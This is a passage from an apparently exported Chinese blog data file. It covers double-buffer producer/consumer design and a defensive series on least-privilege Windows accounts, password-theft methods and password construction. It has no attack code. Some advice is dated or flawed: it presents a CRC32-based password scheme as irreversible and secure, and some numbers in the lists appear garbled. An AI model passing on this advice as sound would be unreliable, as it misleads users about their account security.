社区中的地位，大伙儿应该可以放心使用该模板。 对于 C 程序员，可以去看看开源项目 circbuf，不过该项目是 GPL 协议的（可能有人会觉得不爽）；而且活跃度不太高；而且只有一个开发人员。大伙儿慎用！建议只拿它当参考。 对于 C# 程序员，可以参考 CodeProject 上的一个示例。 ◇用于并发进程 进程间的环形缓冲区，似乎少有现成的库可用。大伙儿只好自己动手、丰衣足食了。 适合进行环形缓冲的 IPC 类型，常见的有“共享内存和文件”。在这两种方式上进行环形缓冲，通常都采用数组的方式实现。程序事先分配好一个固定长度的存储空间，然后具体的读写操作、判断“空”和“满”、元素存储等细节就可参照前面所说的来进行。 共享内存方式的性能很好，适用于数据流量很大的场景。但是有些语言（比如 Java）对于共享内存不支持。因此，该方式在多语言协同开发的系统中，会有一定的局限性。 而文件方式在编程语言方面支持很好，几乎所有编程语言都支持操作文件。但它可能会受限于磁盘读写（Disk I/O）的性能。所以文件方式不太适合于快速数据传输；但是对于某些“数据单元”很大的场合，文件方式是值得考虑的。对于进程间的环形缓冲区，同样要考虑好进程间的同步、互斥等问题，限于篇幅，此处就不细说了。 下一个帖子，咱们来聊一下双缓冲区的使用。 架构设计：生产者/消费者模式[4]：双缓冲区文章目录 ★为啥要双缓冲区？★双缓冲区的原理★双缓冲区的几种状态★可能的并发问题★应用场景 “双缓冲区”是一个应用很广的手法。该手法用得最多的地方想必是屏幕绘制相关的领域（主要是为了减少屏幕闪烁）。另外，在设备驱动和工控方面，双缓冲也经常被使用。不过今天要聊的，并不是针对上述的某个具体领域，而是侧重于并发方面的同步/互斥开销。另外提醒一下，双缓冲方式和前面提到的队列缓冲、环形缓冲是可以结合使用滴。 ★为啥要双缓冲区？ 记得前几天在介绍队列缓冲区时，提及了普通队列缓冲区的两个性能问题：“内存分配的开销”和“同步/互斥的开销”（健忘的同学，先回去看看复习一下）。“内存分配的开销”已经在介绍环形缓冲区的时候解决了，而今天要介绍的双缓冲区，就是冲着同步/互斥的开销来的。 为了防止有人给咱扣上“过度设计”的大帽子，又得来一个事先声明：只有当同步或互斥的开销非常明显的时候，你才应该考虑双缓冲区的使用。否则的话，大伙儿还是老老实实用最基本、最简单的队列缓冲区吧。 ★双缓冲区的原理 前面说了一通废话，现在开始切入正题，说说具体实现。 所谓“双缓冲区”，故名思义就是要有俩缓冲区（简称 A 和 B）。这俩缓冲区，总是一个用于生产者，另一个用于消费者。当俩缓冲区都操作完，再进行一次切换（先前被生产者写入的转为消费者读出，先前消费者读取的转为生产者写入）。由于生产者和消费者不会同时操作同一个缓冲区（不发生冲突），所以就不需要在读写每一个数据单元的时候都进行同步/互斥操作。（顺便提一下，这又一次展现了【空间换时间】的优化思路） 但是光有俩缓冲区还不够。为了真正做到“不冲突”，还得再搞两个互斥锁（简称 La 和 Lb），分别对应俩缓冲区。生产者或消费者如果要操作某个缓冲区，必须先拥有对应的互斥锁。补充一句：要达到“不冲突”的效果，其实可以有多种搞法，今天只是挑一个简单的来聊。 ★双缓冲区的几种状态 为了加深某些同学的理解，再描述一下双缓冲区的几种状态。 ◇俩缓冲区都在使用的状态（并发读写） 大多数情况下，生产者和消费者都处于并发读写状态。不妨设生产者写入 A，消费者读取 B。在这种状态下，生产者拥有锁 La；同样的，消费者拥有锁 Lb。由于俩缓冲区都是处于独占状态，因此每次读写缓冲区中的元素（数据单元）都【不需要】再进行加锁、解锁操作。这是节约开销的主要来源。 ◇单个缓冲区空闲的状态 由于两个并发实体的速度会有差异，必然会出现一个缓冲区已经操作完，而另一个尚未操作完。不妨假设生产者快于消费者。 在这种情况下，当生产者把 A 写满的时候，生产者要先释放 La（表示它已经不再操作 A），然后尝试获取 Lb。由于 B 还没有被读空，Lb 还被消费者持有，所以生产者进入发呆（Suspend）状态。 ◇缓冲区的切换 接着上面的话题。 过了若干时间，消费者终于把 B 读完。这时候，消费者也要先释放 Lb，然后尝试获取 La。由于 La 刚才已经被生产者释放，所以消费者能立即拥有 La 并开始读取 A 的数据。而由于 Lb 被消费者释放，所以刚才发呆的生产者会缓过神来（Resume）并拥有 Lb，然后生产者继续往 B 写入数据。 经过上述几个步骤，俩缓冲区完成了对调，变为：生产者写入 B，消费者读取 A。 ★可能的并发问题 本来单个缓冲区的生产者/消费者问题就已经是教科书的经典问题了，现在搞出俩缓冲区，所以就更加耗费脑细胞了。一不小心，就会搞出些并发的Bug，而且并发的Bug还很难调试和测试（这也就是为啥不要轻易使用该玩意儿的原因）。 ◇死锁的问题 假如把前面介绍的操作步骤调换一下顺序：生产者或消费者在操作完当前的缓冲区之后，先去获取另一个缓冲区的锁，再来释放当前缓冲区的锁。那会咋样捏？ 一旦两个并发实体【同时】处理完各自缓冲区，然后【同时】去获取对方拥有的锁，那就会出现典型的死锁（死锁的详细解释参见“这里”）场景。它俩从此陷入万劫不复的境地。 ★应用场景 介绍完并发问题，按照本系列的惯例，最后再来介绍一下双缓冲区在某些场合的应用。 ◇用于并发线程 在线程方式下，首先要考虑的是缓冲区的类型：到底用队列方式还是环形方式。这方面的选择依据在介绍环形缓冲区的时候已经阐述过了，此处不再啰嗦（省去不少口水）。 另一个需要注意的是，某些编程语言或者程序库提供了的线程安全的缓冲区（比如 JDK 1.5 引入的 ArrayBlockingQueue）。由于这种缓冲区会自动为每次的读写进行同步/互斥，所以就把双缓冲的优势抵消掉了。因此，大伙儿在进行缓冲区选型的时候要避开这类缓冲区。 ◇用于并发进程 在进程间使用双缓冲，先得考察不同 IPC 类型的特点。由于今天讨论双缓冲的目的是降低同步/互斥的开销，对于那些已经封装了同步/互斥的 IPC 类型，就没太大必要再去搞双缓冲了（单凭这条就足以让好多种 IPC 出局）。剩下的 IPC 类型中，比较适合用双缓冲的主要是：共享内存和文件。非常凑巧，这两个玩意儿的特点和适用范围在环形缓冲区的帖子里面也已经介绍过了，俺又可以节省不少口水 :)","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"如何防范黑客入侵？","date":"2021-07-16T16:21:38.000Z","path":"2021/07/17/如何防范黑客入侵？/","text":"如何防止黑客入侵[1]：避免使用高权限用户文章目录 ★基本概念扫盲★反面教材★危害性★你该如何做？★可能的麻烦 为啥俺把这个话题列在头一条？——因为这是个非常普遍、且远远没有得到重视的问题。根据俺的经验，如果你能够养成好习惯，【不】使用高权限用户（尤其是管理员）进行日常操作，就可以大大降低被黑的概率。下面，俺就来具体介绍一下。 ★基本概念扫盲 考虑到本文是面向外行人士，先进行一下名词解释。 ◇用户权限 所谓的“用户权限”，通俗地说，就是某个用户的权力有多大。权力越大，能干的事情越多。 ◇用户组 用户组，顾名思义，就是一组用户的集合。 在主流的操作系统中，“用户权限”通常是和“用户组”挂钩滴。针对不同的用户组，分配了不同的权限。 为了让用户省事儿，Windows 系统内置了若干用户组（比如：Users、Power Users、Guests、等）。这些内置的用户组，事先已经预定义好若干用户权限。 ◇高权限用户 本文提及的【高权限用户】，主要是指 Windows 系统中 Administrators 组的用户或 Linux/Unix 系统中 root 组的用户。 另外，顺便消除一个误解。很多菜鸟以为：Windows 系统中，只有用户名为“Administrator”的用户才具有管理员权限。其实捏，任何一个用户，即使用户名不叫“Administrator”，只要是属于“Administrators 组”，也同样具有管理员权限。 ★反面教材 菜鸟的例子就不提了，光说说俺接触过的很多程序员吧。这帮家伙在使用 Linux/Unix 系统进行开发时，都晓得应该用普通用户的帐号进行操作；当需要做某些高级权限的操作，再切换到管理员帐号（root 帐号）。但即便是这些开发人员，在自己的 Windows 系统中，却喜欢用管理员（Administrator）进行日常操作，实在是很讽刺。 如果连 IT 专业的开发人员都这样，那不太懂技术的菜鸟，就可想而知了。 ★危害性 如果你平时总是用管理员权限登录到系统并进行日常工作，那就意味着你所运行的每一个程序，同时也具有了管理员权限。要知道，管理员权限的权力是非常大滴——几乎可以干任何事情。 假设你有上述【坏】习惯。某天，你从网上下载了一个软件，且软件已经感染了病毒。那么，当你运行这个软件时，这个病毒就会被激活。更要命的是，它也同样具有【管理员权限】。也就是说，病毒获得了与杀毒软件平起平坐的地位。假如这个病毒的作者水平再高一些，甚至可以骗过杀毒软件或者直接把杀毒软件干掉。 除了病毒，木马也是一样。假设你上网的时候，一不留神访问了某个挂马的网站。一旦木马被激活，也同样是以【管理员权限】运行，危害同样也巨大。 ★你该如何做？ 考虑到 Windows 系统的用户占绝大多数，俺就光拿 Windows 系统来说事儿。希望 Linux 及 Mac OS 的 fans 不要见怪哦。 为了尽量少用高权限用户。你最好刚装好系统之后，单独创建一个非管理员用户。 你可以让该用户仅仅属于“Power Users 组”，如下图： 如果想更安全的话，可以只加入“Users 组”，今后，就主要通过这个用户进行日常的操作。如下图： 考虑到有些同学不了解这两个用户组，在权限方面与管理员有啥区别。俺简单列举一下。 ◇“Power Users组”与“Administrators 组”的差别 相对于“Administrators 组”，“Power Users 组”缺少了如下几项权限（俺只列主要的）：\\1. 不能添加、删除、禁用系统中的其它用户。\\2. 不能修改其它用户的属性（包括口令、所属的用户组、等）\\3. 不能安装/卸载硬件驱动程序。\\4. 不能安装/卸载某些应用软件。\\5. 不能查看系统的安全日志。 ◇“Users 组”与“Administrators 组”的差别 “Users 组”的权限比“Power Users 组”更小。除了“Power Users 组”做不到的事情，“Users 组”还【缺少】如下权限（俺只列主要的）：\\1. 不能修改系统时间。\\2. 不能修改某些系统目录（包括：系统盘的 \\WINDOWS 目录、系统盘的 \\WINDOWS\\SYSTEM32 目录、系统盘的 \\Program Files 目录）。\\3. 不能启动/停止某些系统服务。\\4. 不能修改注册表 HKEY_LOCAL_MECHINE 下的所有键值。 从上述对照，明显可知，“Users 组”的权限更小，使用起来更安全。比如说，即使你运行了一个带毒的程序，由于病毒和你一样，也仅有“Users 组”的权限。所以病毒也就无法修改/破坏重要的系统目录，掀不起太大风浪。 ★可能的麻烦 通常来说，越安全的措施，往往也意味着越麻烦。但是这些麻烦，都有相应的解决之道。 ◇切换用户的麻烦 当你以普通用户身份登录后，可能由于某些原因，需要用管理员用户干点事情。但是你（可能是开了很多程序）又不想把当前用户注销。 俺的建议是：使用【快速用户切换】（洋文叫：Fast User Switching）功能来切换用户。此功能从 Windows XP 开始提供。简单地说，就是可以让几个不同的用户同时登录同一个系统，平滑地切换。有了此功能，这个麻烦就不明显啦。 如果你非常不幸，还在使用比较古老的 Windows 2000 系统；或者你使用的是 Windows 的服务版本（比如 Windows Server 2003）。在这些版本的 Windows 系统中，默认是没有“快速用户切换”功能滴。这可咋办捏？ 俺的建议是： 可以在【不】注销当前用户的情况下，以另一个用户（比如管理员）启动某个需要更高权限的程序。为了说清楚，举例如下： 假设你当前处于一个普通用户的环境，但是想另外启动一个具有管理员权限的程序，比如说命令行程序（cmd.exe）。\\1. 你先创建一个指向 cmd.exe 的快捷方式。（该咋样创建快捷方式，就不用俺来教了吧？）\\2. 用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。 \\3. 在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，即可。至此，快捷方式创建完毕。 \\4. 以后，如果你想在普通用户环境中，以管理员身份执行命令行，只需点击该快捷方式，就会弹出如下对话框。然后在该对话框中输入管理员的用户名和口令，就能以管理员的身份，把该命令行启动起来。 ◇安装软件/驱动的麻烦 安装驱动总是需要【管理员权限】才行；另外，很多软件（比如 MS Office）在安装时，也要求用【管理员权限】进行。 俺的建议是： 在刚装好系统之后，先用管理员用户把上述这些软件/驱动程序都搞好。然后，就无需再用管理员用户了。毕竟你经常使用的软件相对固定，不可能三天两头安装软件或驱动（除非你是软/硬件发烧友）。即便偶尔需要重新装个软件或驱动，也可以用上述介绍的方式，【临时】切换到管理员权限。 ◇修改系统时间的麻烦 如果你平时用的是“Users 组”而不是“Power Users 组”，那你连修改系统时间的权限也没有。 俺的建议是： 启用 Windows 系统自带的时间同步服务，让它帮你自动同步系统时间。 除了上述这几点，如果还有谁碰到其它的麻烦，也欢迎来信跟俺交流。俺会补充到本文中。本系列的下一个帖子，将会介绍攻击者是如何搞定你的口令/密码 如何防止黑客入侵[2]：攻击者如何搞定你的口令/密码？文章目录 ★使用密码的场合（密码的类型）★攻击者如何通过技术手段搞定的你的密码？★攻击者如何通过【非技术】手段搞定的你的密码？★结尾 在上文，俺强调了高权限用户的潜在风险。接下来，咱要介绍一下，和口令相关的安全话题。毕竟在大伙儿的日常生活中，口令的使用是必不可少滴。 考虑到和口令相关的内容较多，俺分两部分来说：今天首先揭露攻击者的种种伎俩；下一帖再详述应对的措施。 ★使用密码的场合（密码的类型） 为了便于后面的叙述，俺有必要先总结一下，使用口令的几种场合。 针对这几种不同的场合，攻击者会采取不同的攻击手法；因此，大伙儿也要采取针对性的防范手法。 ◇操作系统用户的口令 这种场合应该好理解。目前主流的操作系统都具有口令验证的用户登录机制。 ◇各种网络应用的口令 随着网络（尤其是 Web）的普及，这种场合越来越多。比如：电子邮件（Email）、即时通讯（IM）、论坛（BBS）、上网炒股、等，都需要有用户口令认证。 ◇各种本地应用程序的口令 此种场合可能不如网络应用的口令那么常见。比如：用口令加密的压缩文件、用口令加密的 Office 文档、PGP 密钥的口令、Outlook 设置的启动口令…… ◇其它 除了上述3种类型，其它那些比较少见、杂七杂八的，统统归为其它。比如：BIOS 的开机口令。 ★攻击者如何通过技术手段搞定的你的密码？ 前面列举了密码的不同使用场合。接着咱要介绍一下：攻击者会利用哪些技术手段，攻破你的密码。 ◇木马盗取 如果你的电脑已经被攻击者安装了木马，那你的一举一动有可能都会被监视。在这种情况下，你在这台电脑上输入的任何密码，都将会被攻击者获取。所以，这种情况是很危险滴——不管是哪种类型的密码，都可能被盗。 至于如何防止自己的计算机被植入木马，【不是】本帖的重点。俺会在本系列后续的帖子中专门介绍木马的防范。 ◇弱密码猜解 所谓的“弱密码猜解”，就是说：如果你的密码比较弱，攻击者就容易猜出来。这种攻击手法，对于操作系统用户口令、网络应用口令、本地应用口令，统统适用。 而且攻击者在盗取口令的时候，通常会先尝试进行弱口令猜测。为啥捏？因为大部分用户都不太具有安全意识，口令都会比较简单（比较弱）。并且，根据【二八原理】，绝大多数的傻瓜用户会使用极少数的弱口令。所以，攻击者先把最流行的那些个弱口令挨个试验一遍，没准就已经成功了。 为了让大伙明白弱口令的严重程度，来看看2009年底的“一个案例”。 话说国外一个小有名气的交友网站（RockYou）被黑客攻破。里面大约3260万用户数据被盗。更加杯具的是，RockYou 采用明文方式存储用户的口令。因此，这3260万用户的口令也统统暴露鸟。后来有好事者把被盗的用户口令拿来分析一番。结果发现，有相当多的用户在使用一些极其弱智的口令。 用的最多的 TOP 10 分别是： \\1. 123456\\2. 12345\\3. 123456789\\4. password\\5. iloveyou\\6. princess\\7. rockyou\\8. 1234567\\9. 12345678\\10. abc123 据说名列第一的口令（123456）有30万人使用，真是不看不知道，一看吓一跳啊！ ◇暴力破解 除了对弱密码进行猜解，攻击者还可以通过穷举的的方式，破解中等强度的密码。所谓的穷举法，就是把所有可能的字母/数字的组合都试验一遍，直到找到正确的密码。 现在 CPU 的计算能力日新月异，尤其是多核 CPU/GPU 普及之后，暴力破解的效果会越来越好。你的密码必须【很强】，才能彻底消除暴力的风险。 由于这种攻击手法，需要进行成千上万次的试错，所以比较适合针对本地应用的口令（比如破解加密的压缩文件），而不太适合对网络应用进行在线口令破解。 在下一个帖子，俺会介绍《如何构造安全的口令/密码》。 ◇网络传输截获（嗅探） 在这种方式下，攻击者会通过【嗅探】的方式，分析你的上网数据。如果你在上网过程中，存在明文传输的口令，就会被截获。 非安全专业的网友，可能不太明白什么是“嗅探”，俺来稍微解释一下。攻击者会利用某些嗅探软件，收集网络上传输的所有数据。这个过程好比电话窃听。嗅探软件类似于窃听器；你的上网数据类似于电话的通话内容。 这几年，随着现在无线网络（WiFi）的普及，网络嗅探的风险大大增加，列位看官切不可掉以轻心哦。 ◇客户端截获 所谓“客户端截获”，通常是针对网络应用的口令而言。举几个例子。 举例1： 很多网友上网时，为了免去输入口令的麻烦，会让浏览器帮忙记住口令。通常浏览器会把这些口令保存在某个文件中（可能以明文方式，也可能以密文方式）。如果某天你的电脑中了木马，那么木马程序有可能会盗走这个保存口令的文件。然后攻击者就可以通过分析该文件，破解出你保存过的所有网络应用的口令。 举例2： 如果你是软件公司的开发人员，多半你会使用某种源代码版本管理工具（比如 SVN、CVS、等）。为了免去每次操作时输入口令的麻烦。通常开发人员会让这些客户端软件记住用户名和口令。如果哪天你中了木马，或者笔记本电脑被盗，那么攻击者同样可以破解你保存下来的口令，进而用你的身份盗取源代码。 ◇服务端截获 和“客户端截获”方式相对的，还有“服务端截获”。具体是啥意思捏？俺来解释一下。 凡是利用口令进行验证的软件系统，都需要存储和口令相关的信息。否则的话，软件系统就无法验证用户输入的口令。如果攻击者能够拿到这些口令的关联信息，那他/她就有可能分析出口令是啥。 （如果你不是搞 IT 专业滴，下面这段可能看不太明白。不过没关系，不影响你理解后续章节） 简而言之，通常有三种方式来存储口令的关联信息：1、存储口令的明文；2、存储口令经过加密后的密文；3、存储口令的散列值。 第一种方式是最土鳖的，稍微先进一些的系统，都不这么干了。后面两种方式，虽然看不到明文，但是攻击者还是有可能通过某种技术手段，反推出口令的明文。具体细节，本文就不再多说了。 那攻击者如何获得存储在软件系统的口令关联信息捏？其实前面提到的 RockYou 网站的杯具，就是一个很好的例子。俺再举另一个例子。 比如说：某个 Linux/Unix 服务器存在安全漏洞，攻击者利用此漏洞搞到了 /etc/shadow 文件。那么攻击者就可以采用上述提到的暴力破解的招数，攻破该服务器上所有强度较弱的口令。 ★攻击者如何通过【非技术】手段搞定的你的密码？ 说完了技术手段，自然就得再说说【非】技术手段。所谓的非技术手法，也就是社会工程学手法。用于盗取密码的社会工程学手法，大概有如下几种。 ◇偷窥 偷窥是最简单的一种社会工程学攻击手法。虽然简单，但是有效。比如很多盗取银行卡的家伙，就是偷窥的手法，得到被害人的银行卡密码。 ◇网络钓鱼（phishing） 另外一个骗取口令的方式，就是通过网络钓鱼。比如某些攻击者，会伪造一个银行的网站。其界面和真实的网站一模一样。然后通过某种方式（比如：虚假链接、欺诈邮件、DNS 欺骗 …），引诱你到这个网站上。由于假网站和真网站的界面很像，你可能信以为真，然后在假网站中输入你的用户名和密码。 有些高明的钓鱼网站，会采用类似Web代理的技巧：把你的所有输入操作，转而提交给真网站；然后把真网站输出的界面，再转回给受害者看。这样的话，受害者就跟在真实网站进行插作，没啥区别，不易看出破绽。 更多关于网络钓鱼的介绍，可以参见维基百科的“这个页面”。 ◇分析 如果攻击者对你比较了解，那么他有可能通过深入的分析，攻破你的口令防护。 有木有觉得很神奇？很匪夷所思？其实这种招数很常见，且不算太难。俺来举个例子。 相信很多网友都用过电子邮箱的找回口令功能。当你口令遗忘之后，可以通过回答事先预设的问题，来找回口令。很多不太专业的用户，预设的问题都很简单（比如：你的手机号是多少？比如：你的生日是哪天？）。对于这类过于简单的问题，攻击者可以很容易地找到答案，从而窃取到你的邮箱口令。 ◇欺骗 最近几年，通过电话诈骗，骗取银行卡密码的案例越来越多。这种作案手法，就属于社会工程学中，“欺骗”的范畴。其实在IT领域，某些黑客也会利用这种手法来获取口令。 ★结尾 介绍到这里，列位看官对黑客盗取口令的手法，应该有一个初步的认识了。本系列的下一个帖子，具体介绍如何构造安全的口令/密码。 如何防止黑客入侵[3]：如何构造安全的口令/密码文章目录 ★【不要】共用口令/密码★密码的【分级机制】★一些反面教材——【脆弱】密码的举例★如何构造【复杂】密码？★结尾 在上文，俺介绍了攻击者，是如何攻破口令这道关口的。为了避免口令被轻易地破解，有必要了解构造安全密码的技巧。所以，今天就来介绍此话题。 ★【不要】共用口令/密码 俺发现有相当多的同学喜欢靠一个口令包打天下。这是相当相当危险的事情。同一个口令，用的场合越多，则泄密的危险越大。而一旦泄露，你的安全防线就会全面崩溃。 所以，今天要讲的头一个要点，就是绝对不要在所有（大多数）场合，使用同一个口令。 ★密码的【分级机制】 由于共用口令存在很大的风险，比较稳妥的办法就是——每一个场合仅使用一个密码。但是很多人会抱怨说：这样会很繁琐，增加了很多的麻烦。那如何才能做到既安全，又不太麻烦捏？这就要引入密码的分级机制。 根据安全圈内一个人所共知的常识：越安全的措施，通常也就越麻烦，成本也高；反之亦然。另外，根据二八原理，非常重要口令毕竟只占少数。所以，就像电影要有分级机制一样，你的密码/口令也要引入分级的概念。通过分级机制，对大多数不太重要的口令，可以采取简化的安全措施；而对少数重要的口令，采取高度安全的措施。 下面，就来介绍一下，如何对不同的口令，进行分类。 ◇第1级：不重要的口令 所谓不重要的口令，就是说万一被盗了或者忘记了，对你没啥损失。 比如，俺经常碰到一些土鳖的论坛，只允许注册会员从上面下载附件。因此俺就经常临时注册一个账号，然后登录上去下载东西。这类账号，基本上都属于一次性的（用完即扔），所以重要程度很低。 对于那些不重要的口令，基本上不用考虑太多安全性的因素。随便设置一个即可。 ◇第2级：重要但少用的口令 对于重要的口令，还要根据其使用的频繁程度，再区别对待。有些口令虽然重要，但是使用的频度很低。由于这类口令很少使用，所以设置得麻烦一些，问题也不大。 比如俺管理的一些研发的服务器（比如源代码服务器），其重要程度非常高，但是平常基本无需登录。 ◇第3级：重要且频繁使用的口令 最后这类口令，既重要，又经常用。所以，设置这类口令就比较讲究。要同时兼顾安全性和易用性。 比如自己日常使用的操作系统用户密码，就属于此类。 ★一些反面教材——【脆弱】密码的举例 说完了分级机制。接下来俺先列举一些反面教材，让大伙儿看看，啥样的口令算是脆弱的？（顺便说一下：2011年底，国内各大网站纷纷被脱库。） ◇口令和用户名一样 无需多说，这种情形的口令，非常脆弱。 ◇口令是一串简单数字 在上文，俺举了RockYou 网站用户数据被盗的案例。在该网站3200万用户中，最受欢迎的十大弱智口令分别是： 123456789101. 1234562. 123453. 1234567894. password5. iloveyou6. princess7. rockyou8. 12345679. 1234567810. abc123 从这个 TOP 10 可以看出，有一半是采用连续数字。所以，用连续的数字串（包括顺序和逆序）作密码，也是很愚昧滴。 ◇口令太短 如果你的口令小于6个字符，是很容易被暴力破解滴。毕竟，小于6个字符的所有组合，也没多少个。对专门穷举密码程序来说，那简直是小菜一碟。 ◇用英文单词作口令 用【单个】英文单词作口令，也很容易被破解。毕竟，常用的英文单词，也就千把个；算上冷僻的，也就几万个。 在许多年以前，就有黑客专门收集整理了英文单词的列表（称之为“口令字典”）。而且这个字典是根据单词的使用频度进行排序。有了这种密码破解字典，密码破解程序就可以轻易猜解出那些使用单个英文单词的密码。 ◇用日期作口令 有些同学希望用某个具有特殊意义的日期（比如：生日、结婚纪念日…）作为口令。要知道这种伎俩也是不灵滴。因为常见的日期，大都分布在最近100年的范围内。所以充其量，可能的个数也就大约是365*100个。即便把不同的日期表示格式考虑进去，也多不了几倍。在这个数量级上，对于暴力破解工具而言，还是小菜一碟。 ◇其它的烂口令 上述列举的这几种情况，大伙儿一定要避免。另外，你还可以去围观一下某老外整理的一个滥口令大全（这老外真有耐心）。提醒一下：这个列表是根据欧美用户统计的，未必适合中国的国情。 ★如何构造【复杂】密码？ 前面已经说了：口令太简单，容易被破解。但是太复杂的话，万一自己也忘了，那可就完蛋了。所以，很多网友都纠结于口令到底该复杂到什么程度。俺的经验是：口令要做到对自己简单，对别人复杂。 下面就来介绍俺在这方面的经验。 ◇用多个单词构成词组 前面提到，如果用【单个】英文单词作密码，容易遭受字典攻击。为了避免字典攻击，可以考虑由25个英文单词构成密码。如果你英语不灵光或你比较习惯中文，也可以考虑用25个汉字的拼音来构成密码。 优点 由于能显著增加密码长度，可以抗击暴力破解。缺点 有可能需要改变你记忆密码的习惯。 口令中仅包含字母，复杂度不够高。 ◇插入特殊字符 刚才提到了用多个单词或汉字拼音构造密码。为了让密码的强度再好一些，还可以在单词或汉字拼音之间，插入一些特殊字符。 最常见的是插入空格。当然，你也可以考虑插入其它字符（比如：下划线、减号、斜杠、井号、星号、等）。 通常进行暴力破解时，为了加快破解进度，都只针对字母和数字进行暴力破解。如果你的口令中含有特殊字符，会大大提高攻击者的难度。 优点 由于口令包含较多特殊符号，复杂度大大提高。缺点 很多特殊字符的输入，要依赖于 SHIFT 键辅助。对于键盘指法不流畅的同学，可能会影响你输入密码时的击键速度，给偷窥者留下可乘之机。 ◇字符变换 所谓的字符变换，就是用形状类似的字母和数字进行相互替换，通过这种变换，可以规避前面提到的基于口令字典的攻击。 常见的变换有如下几种： 123456789字母o 和 数字0字母l 和 数字1字母z 和 数字2字母s 和 符号$字母g 和 数字9字母q 和 数字9字母a 和 符号@字母b 和 数字6字母x 和 符号* 假设俺想用单词 program 作为口令，那么经过上述的变换之后，就成为 pr09r@m 很明显，变换之后的口令同时具有字母、数字、符号。强度相当好 :) 以上变换仅仅是举例。你可以对俺给出的这几个变换，进行扩展，以满足自己的习惯与偏好。 优点 【不用】改变你原先的记忆习惯。 由于口令包含较多特殊符号，复杂度大大提高。缺点 如果你想好的口令中，恰巧所有字母都没有对应的变换，那就比较不爽啦。 ◇键位平移 这个招数也比较简单，就是在进行键盘输入时，把手【向右】平移一个键位。通常咱们在盲打时，两只手的食指分别对着字母 F 和字母 J。平移之后，则食指对着 G 和 K。 假设俺想用单词 program 作为口令，那么经过上述的变换之后，就成为 [tphts 经过这种输入法，口令已经面目全非。但是对你自己来说，并不难记。 优点 【不用】改变你原先的记忆习惯。 口令看起来完全没规律。缺点 依赖于 QWERT 的键盘布局。万一哪天你想在非 QWERT 键盘（比如某些手机键盘）上输入口令，那你就歇菜了。 ◇藏头诗 在某些古代小说的情节中，经常可以看见藏头诗的桥段。藏头诗的点子，也可以借用来构造安全口令。 为了用此招数，你先要想好一句令你印象深刻的话。这话可以是中文，也可以是英文、法文、火星文……反正只要是你熟悉的语言既可。最好这句话的字数（单词数）在8~20之间。然后你把这句话每一个单词的头一个字母取出来，组合成一个口令。如果是中文的话，就把每一个字的拼音的声母取出，组合成口令。 假设俺想好的话是：“只有偏执狂才能生存”。那么用拼音的声母表示就成为 zypzkcnsc 优点 【不用】改变你原先的记忆习惯。 口令看起来完全没规律。缺点 口令中仅包含字母，复杂度不够高。 如果句子中的字数（单词数）不够多，效果就不够好。 对于港台的同学，由于没学过汉语拼音，只好用英文的藏头诗了。好在港台的英语教育通常比大陆好，应该关系不大 :-) ◇巧用 SHIFT 键 在构造口令的时候，适当地组合一下 SHIFT 键，有时也可以达到不错的效果。假如你的口令中，有部分字符是数字，那当你输入口令时，按住SHIFT键会让这些数字字符变为特殊符号。 优点 【不用】改变你原先的记忆习惯。 由于口令包含较多特殊符号，复杂度大大提高。缺点 万一你原先的口令仅有字母，没有数字，则密码的强度会稍微打折扣。 由于要依赖于 SHIFT 键进行切换，会影响你输入密码的击键速度。这会给偷窥者留下可乘之机。 ◇运用数学等式 还有一种又好记，看起来又复杂的密码构造方式——运用数学等式。 比如，可以把密码设计成：7+8=15 虽然只有6个字符，但是由于包含了符号，已经有一定的强度。如果你觉得6字符太少，可以很容易增加字符数及复杂度，比如改为：37+(9*2)=55 如果你觉得还不够复杂，还可以搞得再变态一点——把某个数用英文表示。比如：two+7=nine 优点 密码同时包含了字母、数字、符号。标准的高复杂度！缺点 需要改变你记忆密码的习惯。 一旦你的口令被别人看到，别人很容易就可以发现你构造口令的规律。 ◇利用散列值（哈希函数） 最后，来说一种俺的看家本领——利用散列值构造口令。 要构造基于散列值的密码，有好几种散列算法可供选择。对于不太懂技术的网友，俺建议用 CRC32 散列算法。为啥用它捏？因为这玩意儿操作起来比较方便。比如，假设俺想得到某个文件的 CRC32 散列值，只要用 7-Zip、WinRAR 之类的压缩工具，把它压缩成 zip 格式的文件，然后就可以看到该文件的 CRC32 值了（因为 zip 格式用 CRC32 散列算法作为文件的校验码）。不信你随便拿手头一个 zip 格式的文件打开来看看就明白鸟。 因为 CRC32 生成的散列值比较【短】，对于懂技术并且安全要求较高的网友，可以用散列值【更长】的散列算法（比如：MD5、SHA1、SHA256 ……）。 现在，详细说一下基于散列值的密码如何构造（以 CRC32 为例，其它散列算法依样画葫芦） 首先，你先想好一个字符串，作为计算散列的种子。这个字符串不需要很复杂，也不需要很长。比方说你叫张三，那你可以拿张三的拼音声母 zs 作为【种子串】（注：此处纯属举例，实际情况中，你应该用【更长】的字符串作为种子串）。 接下来，假设你有一个 hotmal 的邮箱，需要设置口令。你可以先用记事本（notepad）生成一个 txt 文件。里面先写上种子串 zs 再写上 hotmail，存盘。然后把这个 txt 文件用工具压缩成 zip 格式，看一下它的 CRC32 校验码 9C9041C0，然后就拿它作为密码。 如果你再有一个 gmail 邮箱需要设置口令，只要同样地，新建一个 txt 文件并写入 zsgmail，同样计算 CRC32，就可以得到另外一个值 03B2F77D。大伙注意到没有？这两个值看起来没有任何关联性，而且从这两个口令，也看不出和种子串 zs 有啥关系。 优点 密码同时包含了字母、数字，但是没有特殊符号。复杂度属于中高！ 由于散列值具有随机性。也就是说，你看到的绝大多数散列值都没啥规律。 由于散列值具有不可逆性。也就是说，即便有一个密码暴露了，攻击者也看不出规律。 即使有一个密码暴露，别人完全看不出规律。缺点 这种密码是完全随机的，常人是【不可能记住】滴。所以，在密码分级机制中，它仅适合第二级的密码。第三类密码没法这么玩。 此招数的进阶： 1. 你可以把 CRC 算法换成其它散列算法（比如： MD5、SHA1、SHA256 ……），就可以轻易构造出【超长的】密码或口令（几十个字符，甚至上百个字符）。 2. 如果你自己会写点小程序或小脚本，你可以进行 N 